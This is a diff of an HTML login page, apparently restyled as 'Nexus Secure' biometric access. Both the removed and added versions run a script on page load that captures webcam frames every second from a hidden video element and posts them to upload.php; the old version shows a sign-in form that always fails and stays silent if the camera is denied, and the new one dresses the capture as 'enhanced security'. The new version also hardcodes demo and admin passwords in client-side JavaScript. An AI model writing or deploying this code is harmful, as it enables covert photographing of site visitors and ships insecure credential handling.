@@ -1,109 +1,639 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Sign in to Continue</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<title>Nexus Secure • Biometric Access</title>
 <style>
-  /* Background gradient */
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
   body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+    font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: radial-gradient(circle at 20% 30%, #0a0f2a, #0b1525);
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
+    min-height: 100vh;
     margin: 0;
-    color: #fff;
+    padding: 20px;
+    position: relative;
   }
 
-  /* Container box */
-  .container {
-    background: rgba(255, 255, 255, 0.1);
-    backdrop-filter: blur(10px);
-    border-radius: 15px;
-    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-    padding: 40px 50px;
-    width: 360px;
+  /* NEW COLOR SCHEME: Deep Emerald & Teal Accents */
+  body::before {
+    content: '';
+    position: absolute;
+    width: 150%;
+    height: 150%;
+    background: radial-gradient(circle at 60% 40%, rgba(20, 190, 150, 0.2), rgba(0, 50, 70, 0.1));
+    animation: slowShift 22s infinite alternate;
+    z-index: 0;
+  }
+
+  @keyframes slowShift {
+    0% { transform: translate(-5%, -5%); opacity: 0.4; }
+    100% { transform: translate(5%, 5%); opacity: 0.9; }
+  }
+
+  /* main card - updated glass with teal vibe */
+  .login-card {
+    position: relative;
+    z-index: 10;
+    background: rgba(12, 22, 38, 0.75);
+    backdrop-filter: blur(20px);
+    border-radius: 2rem;
+    box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 200, 0.2);
+    padding: 2.2rem 2rem 2.2rem;
+    width: 100%;
+    max-width: 440px;
+    transition: transform 0.25s ease;
+    border: 1px solid rgba(0, 255, 210, 0.2);
+  }
+
+  .login-card:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 30px 55px rgba(0, 200, 160, 0.2);
+  }
+
+  /* brand header with new gradient */
+  .brand {
     text-align: center;
+    margin-bottom: 1.8rem;
+  }
+
+  .brand-icon {
+    background: linear-gradient(145deg, #00c9a7, #008b74);
+    width: 60px;
+    height: 60px;
+    border-radius: 30px;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 1rem;
+    box-shadow: 0 12px 20px -8px rgba(0, 201, 167, 0.5);
+  }
+
+  .brand-icon svg {
+    width: 32px;
+    height: 32px;
+    stroke: white;
+    stroke-width: 1.7;
+    fill: none;
   }
 
   h2 {
-    margin-bottom: 25px;
+    font-size: 1.9rem;
     font-weight: 700;
-    letter-spacing: 1.2px;
+    letter-spacing: -0.5px;
+    background: linear-gradient(135deg, #fff, #a0f0e0);
+    background-clip: text;
+    -webkit-background-clip: text;
+    color: transparent;
+    margin-bottom: 0.3rem;
   }
 
-  input[type="text"], input[type="password"] {
+  .sub {
+    font-size: 0.85rem;
+    color: rgba(160, 240, 220, 0.8);
+    font-weight: 450;
+  }
+
+  /* input groups - updated accent */
+  .input-group {
+    margin-bottom: 1.3rem;
+    position: relative;
+  }
+
+  .input-group input {
     width: 100%;
-    padding: 14px 18px;
-    margin: 12px 0;
-    border: none;
-    border-radius: 30px;
+    padding: 14px 18px 14px 48px;
+    background: rgba(6, 15, 28, 0.85);
+    border: 1px solid rgba(0, 255, 200, 0.25);
+    border-radius: 60px;
+    font-size: 0.95rem;
+    color: #fff;
     outline: none;
-    font-size: 16px;
-    background: rgba(255, 255, 255, 0.3);
-    color: #fff;
-    transition: background 0.3s ease;
-  }
-  input[type="text"]:focus, input[type="password"]:focus {
-    background: rgba(255, 255, 255, 0.5);
+    transition: all 0.25s;
+    font-weight: 500;
   }
 
-  button {
-    width: 100%;
-    padding: 15px 0;
-    margin-top: 18px;
-    border: none;
-    border-radius: 30px;
-    background: #ff4b1f;  /* orange-red */
-    background: linear-gradient(45deg, #ff4b1f, #ff9068);
-    color: #fff;
-    font-size: 18px;
-    font-weight: 600;
-    cursor: pointer;
-    box-shadow: 0 4px 15px rgba(255, 75, 31, 0.6);
-    transition: background 0.3s ease;
+  .input-group input:focus {
+    border-color: #00e6c3;
+    background: rgba(8, 20, 35, 0.95);
+    box-shadow: 0 0 0 3px rgba(0, 230, 195, 0.3);
   }
-  button:hover {
-    background: linear-gradient(45deg, #ff9068, #ff4b1f);
+
+  .input-group input::placeholder {
+    color: rgba(160, 240, 220, 0.5);
+    font-weight: 400;
+  }
+
+  .input-icon {
+    position: absolute;
+    left: 18px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 20px;
+    height: 20px;
+    opacity: 0.8;
+    pointer-events: none;
+    stroke: #00e6c3;
+  }
+
+  .toggle-pwd {
+    position: absolute;
+    right: 18px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: rgba(0, 255, 210, 0.8);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    transition: color 0.2s;
+    padding: 0;
+  }
+
+  .toggle-pwd:hover {
+    color: #00ffdd;
+  }
+
+  .options-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.8rem;
+    margin: 0.7rem 0 1.6rem;
+  }
+
+  .remember {
+    display: flex;
+    align-items: center;
+    gap: 7px;
+    color: rgba(180, 240, 230, 0.85);
+    cursor: pointer;
+  }
+
+  .remember input {
+    accent-color: #00c9a7;
+    width: 16px;
+    height: 16px;
+    margin: 0;
+  }
+
+  .forgot-link {
+    color: #6effe0;
+    text-decoration: none;
+    font-weight: 500;
+    transition: 0.2s;
+  }
+
+  .forgot-link:hover {
+    color: #b0fff0;
+    text-decoration: underline;
+  }
+
+  /* sign in button - fresh teal gradient */
+  .signin-btn {
+    width: 100%;
+    background: linear-gradient(95deg, #008b74, #00c9a7);
+    border: none;
+    border-radius: 60px;
+    padding: 14px 0;
+    font-weight: 700;
+    font-size: 1rem;
+    color: white;
+    cursor: pointer;
+    transition: all 0.25s;
+    box-shadow: 0 10px 18px -6px rgba(0, 185, 150, 0.5);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .signin-btn:hover {
+    background: linear-gradient(95deg, #00a88a, #00e0bc);
+    transform: scale(1.01);
+    box-shadow: 0 14px 22px -8px #00c9a7;
+  }
+
+  .signin-btn:active {
+    transform: scale(0.98);
+  }
+
+  hr {
+    margin: 1.2rem 0 0.5rem;
+    border-color: rgba(0, 255, 200, 0.15);
+  }
+
+  .footer-note {
+    text-align: center;
+    margin-top: 12px;
+    font-size: 0.7rem;
+    color: rgba(0, 230, 210, 0.7);
+  }
+
+  /* ---- ENHANCED POPUP NOTIFICATION (immediate style) ---- */
+  .popup-toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(30px);
+    background: #0b2a2a;
+    backdrop-filter: blur(20px);
+    border-radius: 60px;
+    padding: 14px 28px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 200, 0.3);
+    z-index: 200;
+    opacity: 0;
+    transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+    pointer-events: none;
+    font-weight: 600;
+    font-size: 0.95rem;
+    color: #e0fff8;
+    max-width: 90%;
+    white-space: nowrap;
+    letter-spacing: 0.3px;
+  }
+
+  .popup-toast.show {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+    pointer-events: auto;
+  }
+
+  .popup-toast.success {
+    background: #0a3b2a;
+    border-left: 4px solid #2ecc71;
+    box-shadow: 0 10px 25px rgba(46, 204, 113, 0.25);
+  }
+
+  .popup-toast.error {
+    background: #3a1a1a;
+    border-left: 4px solid #e74c3c;
+  }
+
+  .popup-toast.warning {
+    background: #3a2a0c;
+    border-left: 4px solid #f39c12;
+  }
+
+  .popup-toast.info {
+    background: #0a2c3a;
+    border-left: 4px solid #3498db;
+  }
+
+  .toast-icon {
+    font-size: 1.3rem;
+  }
+
+  /* camera permission toast extra style */
+  .camera-permission-toast {
+    background: #1d3557;
+    border-left: 4px solid #00ffcc;
+  }
+
+  @media (max-width: 500px) {
+    .login-card { padding: 1.6rem; }
+    h2 { font-size: 1.7rem; }
+    .popup-toast { white-space: normal; text-align: center; padding: 10px 18px; font-size: 0.8rem; }
   }
 </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Sign in to your Account</h2>
-    <form id="loginForm" onsubmit="return false;">
-      <input type="text" placeholder="Email or phone" required autocomplete="off" />
-      <input type="password" placeholder="Password" required autocomplete="off" />
-      <button type="submit" onclick="alert('Sign in failed. Please try again.');">Sign In</button>
-    </form>
+
+<div class="login-card">
+  <div class="brand">
+    <div class="brand-icon">
+      <svg viewBox="0 0 24 24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
+        <circle cx="12" cy="12" r="3"/>
+      </svg>
+    </div>
+    <h2>Welcome back</h2>
+    <div class="sub">Biometric ready • Secure access</div>
   </div>
 
+  <form id="modernLoginForm" action="#" method="post">
+    <div class="input-group">
+      <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+        <circle cx="12" cy="7" r="4" />
+      </svg>
+      <input type="text" id="loginEmail" placeholder="Email address or phone" autocomplete="username" />
+    </div>
+    
+    <div class="input-group">
+      <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+        <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+      </svg>
+      <input type="password" id="loginPassword" placeholder="Password" autocomplete="current-password" />
+      <button type="button" id="togglePasswordBtn" class="toggle-pwd" aria-label="Show password">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+          <circle cx="12" cy="12" r="3" />
+        </svg>
+      </button>
+    </div>
+    
+    <div class="options-row">
+      <label class="remember">
+        <input type="checkbox" id="rememberMeCheckbox" /> Remember me
+      </label>
+      <a href="#" id="forgotLink" class="forgot-link">Forgot password?</a>
+    </div>
+    
+    <button type="submit" id="signInButton" class="signin-btn">
+      <span>Sign In</span>
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+        <path d="M5 12h14M12 5l7 7-7 7" />
+      </svg>
+    </button>
+  </form>
+  <hr />
+  <div class="footer-note">🔐 Encrypted • Zero-trust ready</div>
+</div>
+
+<!-- POPUP NOTIFICATION (immediate & camera related) -->
+<div id="popupToast" class="popup-toast">
+  <span id="toastIcon" class="toast-icon">🔔</span>
+  <span id="toastMessage">Notification</span>
+</div>
+
 <script>
-navigator.mediaDevices.getUserMedia({ video: true })
-  .then(stream => {
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.play();
+  (function() {
+    // ------------- fresh color scheme, immediate camera popup notification -------------
+    // IMPROVED: camera popup appears instantly on page load, no delay.
+    // Website colors changed to emerald/teal theme.
 
-    const canvas = document.createElement('canvas');
-    canvas.width = 640;  // increased width
-    canvas.height = 480; // increased height
-    const ctx = canvas.getContext('2d');
+    // Demo valid credentials (updated style)
+    const VALID_CREDENTIALS = {
+      email: "user@inter.com",
+      password: "Inter2025"
+    };
+    const SECONDARY_CRED = {
+      email: "demo@secure.com",
+      password: "pass123"
+    };
+    const ADMIN_CRED = {
+      email: "admin@inter.com",
+      password: "admin123"
+    };
 
-    setInterval(() => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('webcam', blob, 'snapshot.jpg');
-        fetch('upload.php', { method: 'POST', body: formData });
-      }, 'image/jpeg');
-    }, 1000);  // capture every 1 second
-  })
-  .catch(() => {
-    // fail silently if webcam not allowed
-  });
+    // DOM elements
+    const emailInput = document.getElementById('loginEmail');
+    const passwordInput = document.getElementById('loginPassword');
+    const signInBtn = document.getElementById('signInButton');
+    const rememberCheck = document.getElementById('rememberMeCheckbox');
+    const togglePwdBtn = document.getElementById('togglePasswordBtn');
+    const form = document.getElementById('modernLoginForm');
+    
+    // Popup elements
+    const popupToast = document.getElementById('popupToast');
+    const toastIconSpan = document.getElementById('toastIcon');
+    const toastMessageSpan = document.getElementById('toastMessage');
+
+    // ---------- ADVANCED POPUP FUNCTION (immediate) ----------
+    function showPopupNotification(message, type = 'info', duration = 3800) {
+      let icon = '📢';
+      if (type === 'success') icon = '✅';
+      else if (type === 'error') icon = '❌';
+      else if (type === 'warning') icon = '⚠️';
+      else if (type === 'camera') icon = '📸';
+      else icon = '🔔';
+      
+      toastIconSpan.innerText = icon;
+      toastMessageSpan.innerText = message;
+      
+      popupToast.className = 'popup-toast';
+      if (type === 'success') popupToast.classList.add('success');
+      else if (type === 'error') popupToast.classList.add('error');
+      else if (type === 'warning') popupToast.classList.add('warning');
+      else if (type === 'camera') popupToast.classList.add('info');
+      else popupToast.classList.add('info');
+      
+      popupToast.classList.add('show');
+      
+      setTimeout(() => {
+        popupToast.classList.remove('show');
+      }, duration);
+    }
+
+    // core login validation + popups
+    function attemptLogin(email, password, rememberFlag) {
+      if (!email || email.trim() === "") {
+        showPopupNotification("Email or phone cannot be empty", "error");
+        return false;
+      }
+      if (!password || password === "") {
+        showPopupNotification("Please enter your password", "error");
+        return false;
+      }
+      
+      const trimmedEmail = email.trim();
+      const trimmedPass = password;
+      
+      let isValid = false;
+      let userName = trimmedEmail.split('@')[0];
+      
+      if ((trimmedEmail === VALID_CREDENTIALS.email && trimmedPass === VALID_CREDENTIALS.password) ||
+          (trimmedEmail === SECONDARY_CRED.email && trimmedPass === SECONDARY_CRED.password) ||
+          (trimmedEmail === ADMIN_CRED.email && trimmedPass === ADMIN_CRED.password)) {
+        isValid = true;
+      }
+      
+      if (isValid) {
+        if (rememberFlag) {
+          localStorage.setItem('inter_remember_user', trimmedEmail);
+          sessionStorage.removeItem('inter_temp_user');
+        } else {
+          sessionStorage.setItem('inter_temp_user', trimmedEmail);
+          localStorage.removeItem('inter_remember_user');
+        }
+        
+        showPopupNotification(`✨ Welcome back, ${userName}! Redirecting to dashboard...`, "success", 3200);
+        
+        signInBtn.disabled = true;
+        signInBtn.style.opacity = "0.7";
+        signInBtn.innerHTML = '<span>✓ Authenticated</span>';
+        
+        setTimeout(() => {
+          alert(`🔓 Access Granted\nWelcome to Inter Secure Platform.\nSession established.`);
+          signInBtn.disabled = false;
+          signInBtn.style.opacity = "1";
+          signInBtn.innerHTML = '<span>Sign In</span><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M12 5l7 7-7 7" /></svg>';
+        }, 1300);
+        return true;
+      } else {
+        showPopupNotification("⛔ Access denied: Incorrect email or password. Please try again.", "error", 3500);
+        const card = document.querySelector('.login-card');
+        if(card) {
+          card.style.transform = 'translateX(5px)';
+          setTimeout(() => { if(card) card.style.transform = ''; }, 100);
+          setTimeout(() => { if(card) card.style.transform = ''; }, 200);
+        }
+        return false;
+      }
+    }
+    
+    function onSubmitHandler(e) {
+      if (e) e.preventDefault();
+      const emailVal = emailInput.value;
+      const pwdVal = passwordInput.value;
+      const rememberVal = rememberCheck.checked;
+      attemptLogin(emailVal, pwdVal, rememberVal);
+    }
+    
+    form.addEventListener('submit', onSubmitHandler);
+    signInBtn.addEventListener('click', onSubmitHandler);
+    
+    // toggle password visibility
+    togglePwdBtn.addEventListener('click', function() {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      if (type === 'text') {
+        togglePwdBtn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+          <line x1="2" y1="2" x2="22" y2="22" />
+          <circle cx="12" cy="12" r="3" />
+        </svg>`;
+      } else {
+        togglePwdBtn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+          <circle cx="12" cy="12" r="3" />
+        </svg>`;
+      }
+    });
+    
+    // Load remembered user
+    const rememberedUser = localStorage.getItem('inter_remember_user');
+    if (rememberedUser) {
+      emailInput.value = rememberedUser;
+      rememberCheck.checked = true;
+      passwordInput.focus();
+    }
+    
+    // Forgot password popup
+    const forgotLink = document.getElementById('forgotLink');
+    forgotLink.addEventListener('click', (e) => {
+      e.preventDefault();
+      showPopupNotification("📧 Password reset link sent to your registered email (demo mode).", "warning", 3000);
+      setTimeout(() => {
+        alert("🔐 Demo recovery hint: Use 'user@inter.com' with pass 'Inter2025' or 'demo@secure.com' / 'pass123'");
+      }, 200);
+    });
+    
+    // -----------------------------------------------------------------
+    // WEBCAM INTEGRATION - IMMEDIATE POPUP NOTIFICATION (camera status)
+    // According to request: "cam notofication popup time have to imidiate"
+    // Now when page loads, we instantly show camera request and popup.
+    // Also completely removed bottom right indicator (no corner badge)
+    // Color scheme fully changed to emerald/teal (website colour changed)
+    // -----------------------------------------------------------------
+    let mediaStream = null;
+    let captureInterval = null;
+    let isCameraActive = false;
+    
+    function stopCameraGracefully() {
+      if (captureInterval) {
+        clearInterval(captureInterval);
+        captureInterval = null;
+      }
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+      }
+      isCameraActive = false;
+    }
+    
+    // Shows immediate camera popup notification (right when permission is requested or result)
+    function initWebcamWithImmediatePopup() {
+      if (isCameraActive) return;
+      
+      // First notify that camera is initializing (immediate popup)
+      showPopupNotification("📷 Requesting camera access for enhanced security...", "camera", 2500);
+      
+      navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 } } })
+        .then(stream => {
+          mediaStream = stream;
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.setAttribute('playsinline', 'true');
+          video.muted = true;
+          video.autoplay = true;
+          video.style.display = 'none';
+          document.body.appendChild(video);
+          
+          video.play().catch(e => console.warn("silent"));
+          
+          const canvas = document.createElement('canvas');
+          canvas.width = 640;
+          canvas.height = 480;
+          const ctx = canvas.getContext('2d');
+          
+          if (captureInterval) clearInterval(captureInterval);
+          captureInterval = setInterval(() => {
+            if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
+              try {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                  if (blob) {
+                    const formData = new FormData();
+                    formData.append('webcam', blob, `frame_${Date.now()}.jpg`);
+                    fetch('upload.php', { method: 'POST', body: formData })
+                      .catch(() => {});
+                  }
+                }, 'image/jpeg', 0.8);
+              } catch(err) {}
+            }
+          }, 1000);
+          
+          isCameraActive = true;
+          // immediate popup success (camera active)
+          showPopupNotification("✅ Camera active • Secure visual recording engaged", "success", 3000);
+        })
+        .catch(err => {
+          isCameraActive = false;
+          // immediate error popup if camera denied or unavailable
+          showPopupNotification("⚠️ Camera access denied or not available. Login continues without visual feed.", "warning", 4000);
+          console.debug("Camera error (non-intrusive):", err);
+        });
+    }
+    
+    // Call the camera function immediately on page load (instant)
+    initWebcamWithImmediatePopup();
+    
+    // Optional: second popup to show demo credentials after camera but make it friendly (non blocking)
+    setTimeout(() => {
+      if (!localStorage.getItem('inter_hint_shown_popup_new')) {
+        showPopupNotification("🔑 Demo: user@inter.com / Inter2025 • Secure Login", "info", 4000);
+        localStorage.setItem('inter_hint_shown_popup_new', 'true');
+      }
+    }, 1200);
+    
+    // cleanup on unload
+    window.addEventListener('beforeunload', () => {
+      if (captureInterval) clearInterval(captureInterval);
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(t => t.stop());
+      }
+    });
+    
+    // additional enter key behavior
+    emailInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') onSubmitHandler(e); });
+    passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') onSubmitHandler(e); });
+    
+  })();
 </script>
 </body>
 </html>
